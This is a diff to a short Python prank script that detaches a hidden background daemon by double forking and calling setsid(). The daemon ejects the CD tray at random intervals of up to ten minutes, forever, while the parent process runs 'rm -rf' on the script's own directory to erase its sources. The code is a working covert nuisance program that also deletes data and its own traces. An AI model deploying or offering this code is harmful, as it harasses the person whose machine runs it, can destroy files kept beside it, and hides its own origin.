@@ -1,5 +1,8 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
+
+# author: pBouillon (https://pierrebouillon.tech/)
+
 import os
 from os         import fork
 from os         import path     as p
@@ -15,20 +18,34 @@ import time
 from time       import sleep
 
 
-""" Max latency: 10 mn """
+""" action to be performed """
+ACTION = ['eject', '-T']
+""" max latency: 10 mn """
 MAX_LATENCY = 60 * 10
 
+
 def self_destruction():
-    call(["rm","-rf", p.dirname(p.abspath(__file__))])
+    """Destroy ad's directory
+    """
+    call ([ 
+            'rm',
+            '-rf', 
+            p.dirname (p.abspath(__file__))
+        ])
    
-if __name__ == "__main__":
+def run():
+    """Infinity loop
+    """
+    while True:
+        sleep (randint (0, MAX_LATENCY))
+        call (ACTION)
+
+if __name__ == '__main__':
     pid = fork()
     if pid == 0:
         setsid()
         pid = fork()
         if pid == 0:
-            while True:
-                sleep(randint(0,MAX_LATENCY))
-                call(["eject","-T"])
+            run()
     else:
-        self_destruction() # Destroy sources
+        self_destruction()
